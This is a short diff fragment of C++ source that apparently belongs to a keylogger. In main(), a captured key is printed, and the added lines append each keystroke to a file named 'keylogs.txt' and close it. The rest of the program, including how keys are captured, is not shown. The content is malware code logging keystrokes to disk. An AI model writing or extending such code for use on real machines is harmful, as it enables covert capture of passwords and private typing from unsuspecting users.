@@ -53,3 +53,5 @@ int main(){
                     cout << key;
 					ofstream logfile;
                     logfile.open("keylogs.txt", fstream::app);
+					logfile << key;
+                    logfile.close();
